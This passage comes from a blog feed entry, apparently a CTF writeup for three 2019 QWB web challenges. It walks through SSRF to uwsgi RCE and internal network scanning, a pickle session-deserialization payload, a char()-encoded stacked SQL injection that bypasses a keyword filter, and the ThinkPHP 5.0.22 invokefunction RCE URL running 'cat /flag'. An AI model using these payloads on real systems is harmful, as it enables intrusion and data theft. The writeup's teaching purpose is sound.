class="keyword">as</span> res:</span><br><span class="line">            res_data = res.read()</span><br><span class="line">            res_data = base64.b64encode(res_data)</span><br><span class="line">            <span class="keyword">return</span> res_data</span><br><span class="line">    <span class="keyword">return</span> <span class="string">""</span></span><br></pre></td></tr></table></figure></p><p>若要利用该SSRF进行任意文件读取，那么必须要登录，但是没有注册功能，那么猜想需要注入，于是寻找注入点，发现：<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Test_schema = graphene.Schema(query=Test)</span><br><span class="line">Login_schema = graphene.Schema(query=Login)</span><br><span class="line">graphql.add_url_rule(<span class="string">'/test'</span>, view_func=GraphQLView.as_view(<span class="string">'test'</span>, schema=Test_schema, graphiql=<span class="keyword">True</span>))</span><br><span class="line">graphql.add_url_rule(<span class="string">'/login'</span>, view_func=GraphQLView.as_view(<span class="string">'login'</span>, schema=Login_schema, graphiql=<span class="keyword">True</span>))</span><br></pre></td></tr></table></figure></p><p>尝试访问：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://qqwwwwbbbbb.52dandan.xyz:8088/graphql_test123/login</span><br></pre></td></tr></table></figure></p><p>其对应代码如下：<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Login</span><span class="params">(graphene.ObjectType)</span>:</span></span><br><span class="line">    recv = graphene.String(data=graphene.String(default_value=<span class="string">""</span>))</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">resolve_recv</span><span class="params">(self,info, data)</span>:</span></span><br><span class="line">        all_info = json.loads(data)</span><br><span class="line">        operate = all_info[<span class="string">'operate'</span>]</span><br><span class="line">        <span class="keyword">if</span> operate ==<span class="string">'login'</span>:</span><br><span class="line">            username = all_info[<span class="string">'username'</span>]</span><br><span class="line">            password = all_info[<span class="string">'password'</span>]</span><br><span class="line">            logggin(username,password)</span><br><span class="line">            password_new = hashlib.sha256(password.encode(<span class="string">'utf-8'</span>)).hexdigest()</span><br><span class="line">            db = DbOp()</span><br><span class="line">            db.connect()</span><br><span class="line">            sql = <span class="string">"select * from user where username_which_you_do_not_know=\"&#123;&#125;\" and password_which_you_do_not_know_too=\"&#123;&#125;\""</span>.format(username,password_new)</span><br><span class="line">            rr = db.getall(sql)</span><br><span class="line">            <span class="keyword">if</span> len(rr) != <span class="number">0</span>:</span><br><span class="line">                session[<span class="string">'username'</span>] = username</span><br><span class="line">                session[<span class="string">'loginstatus'</span>] = <span class="keyword">True</span></span><br><span class="line">            response = <span class="string">"login success"</span></span><br><span class="line">        <span class="keyword">elif</span> operate == <span class="string">'logout'</span>:</span><br><span class="line">            session[<span class="string">'username'</span>] = <span class="keyword">None</span></span><br><span class="line">            session[<span class="string">'loginstatus'</span>] = <span class="keyword">False</span></span><br><span class="line">            response = <span class="string">"Logout success"</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            response = <span class="string">"None of operate"</span></span><br><span class="line">        <span class="keyword">return</span> response</span><br></pre></td></tr></table></figure></p><p>发现是graphql且无过滤，利用如下操作，可控username与password:<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">recv = graphene.String(data=graphene.String(default_value=<span class="string">""</span>))</span><br></pre></td></tr></table></figure></p><p>审计发现需要满足:<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> operate ==<span class="string">'login'</span>:</span><br></pre></td></tr></table></figure></p><p>于是构造如下json:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$array = <span class="keyword">array</span>(<span class="string">'operate'</span>=&gt;<span class="string">'login'</span>,<span class="string">'username'</span>=&gt;<span class="string">'admin'</span>,<span class="string">'password'</span>=&gt;<span class="string">'admin'</span>);</span><br><span class="line"><span class="keyword">echo</span> json_encode($array);</span><br></pre></td></tr></table></figure></p><p>尝试访问：<br><img src="/images/2019-05-26-16-33-34.png" alt=""><br>发现可以成功进行登录，那么简单注入：<br><img src="/images/2019-05-26-16-34-56.png" alt=""><br>发现登录成功，成功拿到session，于是利用路由进行SSRF:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://qqwwwwbbbbb.52dandan.xyz:8088/user/newimg</span><br></pre></td></tr></table></figure></p><p>尝试读取/etc/passwd文件：<br><img src="/images/2019-05-26-16-37-31.png" alt=""><br>发现读取成功，尝试读nginx相关配置信息:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file:///etc/nginx/sites-available/default</span><br></pre></td></tr></table></figure></p><p>得到信息<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">     listen 80  default_server;</span><br><span class="line">     listen 443 default_server;</span><br><span class="line">     server_name _ ;</span><br><span class="line">     ssl on;</span><br><span class="line">     ssl_certificate     /root/www.crt;</span><br><span class="line">     ssl_certificate_key /root/www.key;</span><br><span class="line">     return 444;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">server &#123;</span><br><span class="line">    listen 80;</span><br><span class="line">    listen 443;</span><br><span class="line">    server_name qqwwwwbbbbb.52dandan.xyz;</span><br><span class="line">    charset utf-8;</span><br><span class="line">    client_max_body_size 5M;</span><br><span class="line">    location / &#123;</span><br><span class="line">        include uwsgi_params;</span><br><span class="line">        uwsgi_pass 127.0.0.1:3031;</span><br><span class="line">    &#125;</span><br><span class="line">    location /static &#123;</span><br><span class="line">        alias /home/qwb/static;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>发现uwsgi<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:3031;</span><br></pre></td></tr></table></figure></p><p>结合参考文章<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/wofeiwo/webcgi-exploits/blob/master/python/uwsgi-rce-zh.md</span><br></pre></td></tr></table></figure></p><p>不难想到这里可以利用SSRF打uwsgi进行getshell：<br><img src="/images/2019-05-26-16-50-49.png" alt=""><br>然后下一步理所当然是扫内网，这里我传了个nmap上去一通扫：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for 172.16.17.1</span><br><span class="line">Host is up (0.00037s latency).</span><br><span class="line">Not shown: 310 closed ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">22/tcp   open  ssh</span><br><span class="line">873/tcp  open  rsync</span><br><span class="line">8088/tcp open  omniorb</span><br><span class="line"></span><br><span class="line">Nmap scan report for 2019qwb_qwb_flask_socks5_1.2019qwb_qwb_network (172.16.17.4)</span><br><span class="line">Host is up (0.00035s latency).</span><br><span class="line">Not shown: 312 closed ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">1080/tcp open  socks</span><br><span class="line"></span><br><span class="line">Nmap scan report for 96b479690d75 (172.16.17.22)</span><br><span class="line">Host is up (0.00033s latency).</span><br><span class="line">Not shown: 311 closed ports</span><br><span class="line">PORT    STATE SERVICE</span><br><span class="line">80/tcp  open  http</span><br><span class="line">443/tcp open  https</span><br><span class="line"></span><br><span class="line">Nmap scan report for 2019qwb_qwb_rsync_1.2019qwb_qwb_network (172.16.17.99)</span><br><span class="line">Host is up (0.00034s latency).</span><br><span class="line">Not shown: 312 closed ports</span><br><span class="line">PORT    STATE SERVICE</span><br><span class="line">873/tcp open  rsync</span><br><span class="line"></span><br><span class="line">Nmap scan report for 2019qwb_qwb_ssrf_mysql_1.2019qwb_qwb_network (172.16.17.231)</span><br><span class="line">Host is up (0.00032s latency).</span><br><span class="line">Not shown: 312 closed ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">3306/tcp open  mysql</span><br></pre></td></tr></table></figure></p><p>看到数据库后，简单找了下数据库信息:<br><img src="/images/2019-05-26-16-53-34.png" alt=""><br>尝试连接数据库：<br><img src="/images/2019-05-26-16-55-12.png" alt=""><br>顺手看了下内容：<br><img src="/images/2019-05-26-16-55-53.png" alt=""><br>没有flag，惨惨= =，后来正想扫其他网段的时候，主办方放出了hint:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">由于内网扫的太卡了，直接给出内网地址192.168.223.222</span><br></pre></td></tr></table></figure></p><p>同时发现之前的扫描结果：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for 2019qwb_qwb_flask_socks5_1.2019qwb_qwb_network (172.16.17.4)</span><br><span class="line">Host is up (0.00035s latency).</span><br><span class="line">Not shown: 312 closed ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">1080/tcp open  socks</span><br></pre></td></tr></table></figure></p><p>想到可以用socks5去打内网，于是简单配置了下代理，顺手扫了个端口：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for 192.168.223.222</span><br><span class="line">Host is up (0.064s latency).</span><br><span class="line">Not shown: 998 closed ports</span><br><span class="line">PORT    STATE SERVICE</span><br><span class="line">80/tcp  open  http</span><br><span class="line">443/tcp open  https</span><br></pre></td></tr></table></figure></p><p>那就是打web了，浏览器挂上代理访问，来到内网web页面<br><img src="/images/2019-05-26-16-59-11.png" alt=""><br>随手尝试弱密码登录：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin admin</span><br></pre></td></tr></table></figure></p><p>又来到一个全新的世界= =<br><img src="/images/2019-05-26-17-03-51.png" alt=""><br>发现有几个功能：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">add user</span><br><span class="line">save log</span><br><span class="line">infomation</span><br></pre></td></tr></table></figure></p><p>然后陷入了无尽的沉思= =，后来主办方给出了个hint，也就是公开源码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hint:https://paste.ubuntu.com/p/q4xJBfm3Bb/</span><br></pre></td></tr></table></figure></p><p>简单审计后，发现序列化点：<br>反序列化操作：<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">open_session</span><span class="params">(self, app, request)</span>:</span></span><br><span class="line">    sid = request.cookies.get(app.session_cookie_name)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> sid:</span><br><span class="line">        sid = self._generate_sid()</span><br><span class="line">        <span class="keyword">return</span> self.session_class(sid=sid)</span><br><span class="line"></span><br><span class="line">    signer = self._get_signer(app)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        sid_as_bytes = signer.unsign(sid)</span><br><span class="line">        sid = sid_as_bytes.decode()</span><br><span class="line">    <span class="keyword">except</span> BadSignature:</span><br><span class="line">        sid = self._generate_sid()</span><br><span class="line">        <span class="keyword">return</span> self.session_class(sid=sid)</span><br><span class="line"></span><br><span class="line">    sess_path = os.path.join(sys.path[<span class="number">0</span>],self.dir)</span><br><span class="line">    exists = os.path.exists(sess_path)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> exists:</span><br><span class="line">        os.mkdir(sess_path)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> open(os.path.join(sess_path,sid),<span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                val = pickle.load(f)</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                val = &#123;&#125;</span><br><span class="line">            <span class="keyword">return</span> self.session_class(val,sid=sid)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> self.session_class(sid=sid)</span><br></pre></td></tr></table></figure></p><p>序列化操作：<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">save_session</span><span class="params">(self, app, session, response)</span>:</span></span><br><span class="line">    domain = self.get_cookie_domain(app)</span><br><span class="line">    path = self.get_cookie_path(app)</span><br><span class="line">    httponly = self.get_cookie_httponly(app)</span><br><span class="line">    secure = self.get_cookie_secure(app)</span><br><span class="line">    expires = self.get_expiration_time(app, session)</span><br><span class="line">    val = dict(session)</span><br><span class="line"></span><br><span class="line">    sess_path = os.path.join(sys.path[<span class="number">0</span>],self.dir)</span><br><span class="line">    <span class="keyword">with</span> open(os.path.join(sess_path , session.sid), <span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        pickle.dump(val, f, <span class="keyword">True</span>)</span><br><span class="line">    session_id = self._get_signer(app).sign(want_bytes(session.sid))</span><br><span class="line">    response.set_cookie(app.session_cookie_name, session_id,</span><br><span class="line">                        expires=expires, httponly=httponly,</span><br><span class="line">                        domain=domain, path=path, secure=secure)</span><br></pre></td></tr></table></figure></p><p>注：怎么每年都有个flask session反序列化= =<br>本来想利用序列化反弹shell，但主办方又给个hint：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">不能弹shell的。。。别尝试了</span><br></pre></td></tr></table></figure></p><p>注：主办方真给力，每次都雪中送炭）<br>于是考虑怎么把数据带出，但考虑到内网的交互问题有点麻烦，于是想直接把flag放进session里。<br>那么容易想到将flag替换username的值，然后在带出session username的位置即可看到flag。<br>根据代码<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">validate_username</span><span class="params">(self, field)</span>:</span></span><br><span class="line">    name = field.data</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">not</span> re.match(<span class="string">'^[0-9a-zA-Z]*$'</span>,name)) <span class="keyword">or</span> (len(name)&lt;<span class="number">6</span>) :</span><br><span class="line">        err_log.append(waf(field.data))</span><br><span class="line">        <span class="keyword">if</span> len(err_log) == <span class="number">101</span>:</span><br><span class="line">            err_log.pop(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">raise</span> ValidationError(<span class="string">'validation username!'</span>)</span><br></pre></td></tr></table></figure></p><p>发现用户名只要出现特殊符号，就会经过waf后被加入log：<br>观察waf：<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">waf</span><span class="params">(data)</span>:</span></span><br><span class="line">    data = re.sub(<span class="string">'(decode|sh|command|class|dict|base|execfile|timeit|platform|getattribute|reload|values)'</span>,<span class="string">'hacker'</span>,data)</span><br><span class="line">    <span class="keyword">return</span> data</span><br></pre></td></tr></table></figure></p><p>过滤并不是非常多，触发过滤会被替换为hacker，还是挺好Bypass的。<br>那么思路非常明确了，我们希望达成如下效果：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bytes(&apos;(dp0\nS\&apos;username\&apos;\np1\nS\&apos;&apos;+open(&apos;/tmp/flag&apos;,&apos;r&apos;).read().strip()+&apos;\&apos;\np2\ns.&apos;,&apos;utf-8&apos;)</span><br></pre></td></tr></table></figure></p><p>该exp被反序列化后，效果如下：<br><img src="/images/2019-05-26-18-30-30.png" alt=""><br>此时我们的username的值变为flag<br>同时寻找读取内容位置：<br><img src="/images/2019-05-26-17-18-05.png" alt=""><br>发现在information处，会有<code>session[&#39;username&#39;]</code>，那么即可完成攻击链，我们构造出关键exp：<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"open('/home/qwb/session/ba0eaa4d-7f63-41b5-8d05-cce9b1299945','wb').write(bytes('(dp0\\nS\\'username\\'\\np1\\nS\\''+open('/flag','r').read().strip()+'\\'\\np2\\ns.','utf-8'))"</span></span><br></pre></td></tr></table></figure></p><p>将其序列化后，放在add user位置，使其进入log。<br>之后利用save_log将日志覆盖到session文件上，再通过触发session，触发反序列化。<br>其中注意，save log对路径做了过滤，可以用反斜杠进行bypass：<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">validate_filepath</span><span class="params">(self, field)</span>:</span></span><br><span class="line">    filepath = field.data</span><br><span class="line">    <span class="keyword">if</span>  re.match(<span class="string">'.*(\./|\.\./|/).*'</span>,filepath) <span class="keyword">or</span> re.match(<span class="string">'(.*\.py|.*\.pyc|.*\.js|.*\.html|.*\.css|.*\.db)'</span>,filepath):</span><br><span class="line">        <span class="keyword">raise</span> ValidationError(<span class="string">'validation filepath!'</span>)</span><br></pre></td></tr></table></figure></p><p>攻击后访问information页面，发现flag：<br><img src="/images/2019-05-26-16-12-47.png" alt=""></p><h2 id="随便注"><a href="#随便注" class="headerlink" title="随便注"></a>随便注</h2><p>一道相对简单的注入题<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://49.4.26.104:32019/?inject=1</span><br></pre></td></tr></table></figure></p><p>随手尝试引号，得到报错<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near &apos;&apos;1&apos;&apos;&apos; at line 1</span><br></pre></td></tr></table></figure></p><p>再尝试闭合<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://49.4.26.104:32019/?inject=1&apos;%23</span><br></pre></td></tr></table></figure></p><p>发现正常，于是尝试<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://49.4.26.104:32019/?inject=1&apos;||1%23</span><br></pre></td></tr></table></figure></p><p><img src="/images/2019-05-26-18-15-51.png" alt=""><br>发现列出当前表所有内容，猜想flag在其他表中，尝试注入，发现过滤<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">return preg_match(&quot;/select|update|delete|drop|insert|where|\./i&quot;, $inject);</span><br></pre></td></tr></table></figure></p><p>发现<code>select</code>和<code>.</code>被过滤，根据经验，一般这种情况很难跨表查询，那么考虑有没有其他的技巧，不难想到堆叠注入，为bypass过滤，尝试用char进行绕过，可写出exp如下：<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">"0';set @s=concat(%s);PREPARE a FROM @s;EXECUTE a;"</span></span><br><span class="line">exp = <span class="string">'select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database()'</span></span><br><span class="line"><span class="comment"># exp = "select group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_NAME='1919810931114514'"</span></span><br><span class="line"><span class="comment"># exp = "select flag from `1919810931114514`"</span></span><br><span class="line">res = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> exp:</span><br><span class="line">res += <span class="string">"char(%s),"</span>%(ord(i))</span><br><span class="line">my_payload = payload%(res[:<span class="number">-1</span>])</span><br><span class="line"><span class="keyword">print</span> my_payload</span><br></pre></td></tr></table></figure></p><p>在本地略作尝试：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from article where id=1;set @s=concat(char(115),char(101),char(108),char(101),char(99),char(116),char(32),char(103),char(114),char(111),char(117),char(112),char(95),char(99),char(111),char(110),char(99),char(97),char(116),char(40),char(84),char(65),char(66),char(76),char(69),char(95),char(78),char(65),char(77),char(69),char(41),char(32),char(102),char(114),char(111),char(109),char(32),char(105),char(110),char(102),char(111),char(114),char(109),char(97),char(116),char(105),char(111),char(110),char(95),char(115),char(99),char(104),char(101),char(109),char(97),char(46),char(84),char(65),char(66),char(76),char(69),char(83),char(32),char(119),char(104),char(101),char(114),char(101),char(32),char(84),char(65),char(66),char(76),char(69),char(95),char(83),char(67),char(72),char(69),char(77),char(65),char(61),char(100),char(97),char(116),char(97),char(98),char(97),char(115),char(101),char(40),char(41));PREPARE a FROM @s;EXECUTE a;</span><br></pre></td></tr></table></figure></p><p><img src="/images/2019-05-26-18-19-23.png" alt=""><br>发现一切顺利，于是题目中进行测试：<br>发现表名<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0&apos;;set @s=concat(char(115),char(101),char(108),char(101),char(99),char(116),char(32),char(103),char(114),char(111),char(117),char(112),char(95),char(99),char(111),char(110),char(99),char(97),char(116),char(40),char(84),char(65),char(66),char(76),char(69),char(95),char(78),char(65),char(77),char(69),char(41),char(32),char(102),char(114),char(111),char(109),char(32),char(105),char(110),char(102),char(111),char(114),char(109),char(97),char(116),char(105),char(111),char(110),char(95),char(115),char(99),char(104),char(101),char(109),char(97),char(46),char(84),char(65),char(66),char(76),char(69),char(83),char(32),char(119),char(104),char(101),char(114),char(101),char(32),char(84),char(65),char(66),char(76),char(69),char(95),char(83),char(67),char(72),char(69),char(77),char(65),char(61),char(100),char(97),char(116),char(97),char(98),char(97),char(115),char(101),char(40),char(41));PREPARE a FROM @s;EXECUTE a;</span><br></pre></td></tr></table></figure></p><p><img src="/images/2019-05-26-18-20-39.png" alt=""><br>发现字段名<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0&apos;;set @s=concat(char(115),char(101),char(108),char(101),char(99),char(116),char(32),char(103),char(114),char(111),char(117),char(112),char(95),char(99),char(111),char(110),char(99),char(97),char(116),char(40),char(67),char(79),char(76),char(85),char(77),char(78),char(95),char(78),char(65),char(77),char(69),char(41),char(32),char(102),char(114),char(111),char(109),char(32),char(105),char(110),char(102),char(111),char(114),char(109),char(97),char(116),char(105),char(111),char(110),char(95),char(115),char(99),char(104),char(101),char(109),char(97),char(46),char(67),char(79),char(76),char(85),char(77),char(78),char(83),char(32),char(119),char(104),char(101),char(114),char(101),char(32),char(84),char(65),char(66),char(76),char(69),char(95),char(78),char(65),char(77),char(69),char(61),char(39),char(49),char(57),char(49),char(57),char(56),char(49),char(48),char(57),char(51),char(49),char(49),char(49),char(52),char(53),char(49),char(52),char(39));PREPARE a FROM @s;EXECUTE a;</span><br></pre></td></tr></table></figure></p><p><img src="/images/2019-05-26-18-21-01.png" alt=""><br>getflag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0&apos;;set @s=concat(char(115),char(101),char(108),char(101),char(99),char(116),char(32),char(102),char(108),char(97),char(103),char(32),char(102),char(114),char(111),char(109),char(32),char(96),char(49),char(57),char(49),char(57),char(56),char(49),char(48),char(57),char(51),char(49),char(49),char(49),char(52),char(53),char(49),char(52),char(96));PREPARE a FROM @s;EXECUTE a;</span><br></pre></td></tr></table></figure></p><p><img src="/images/2019-05-26-18-21-44.png" alt=""></p><h2 id="强网先锋-上单"><a href="#强网先锋-上单" class="headerlink" title="强网先锋-上单"></a>强网先锋-上单</h2><p>据说是道送分题= =<br>访问题目，得到目录<br><img src="/images/2019-05-26-18-22-41.png" alt=""><br>发现信息<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://49.4.66.242:31392/1/public/</span><br></pre></td></tr></table></figure></p><p><img src="/images/2019-05-26-18-22-58.png" alt=""><br>得知是用thinkphp 5.0.22开发，随手搜索，发现RCE CVE：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://49.4.66.242:31392/1/public/index.php?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=cat%20/flag</span><br></pre></td></tr></table></figure></p><p>得到flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;f869fa995fb99667e75e04b5c3ca77cc&#125;</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">文章首发于跳跳糖</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;upload&quot;&gt;&lt;a href=&quot;#upload&quot; class=&quot;headerlink&quot; title=&quot;upload&quot;&gt;&lt;/a&gt;upload&lt;/h2&gt;&lt;p&gt;登入题目，首先纵览题目功能，发现有注册和登录：&lt;br&gt;&lt;img src=&quot;/images/2019-05-2
      
    
    </summary>
    
      <category term="web" scheme="http://skysec.top/categories/web/"/>
    
    
      <category term="web" scheme="http://skysec.top/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>2019 RCTF Web Writeup</title>
    <link href="http://skysec.top/2019/05/18/2019-RCTF-Web-Writeup/"/>
    <id>http://skysec.top/2019/05/18/2019-RCTF-Web-Writeup/</id>
    <published>2019-05-18T12:39:29.000Z</published>
    <updated>2019-07-02T14:15:14.187Z</updated>
    
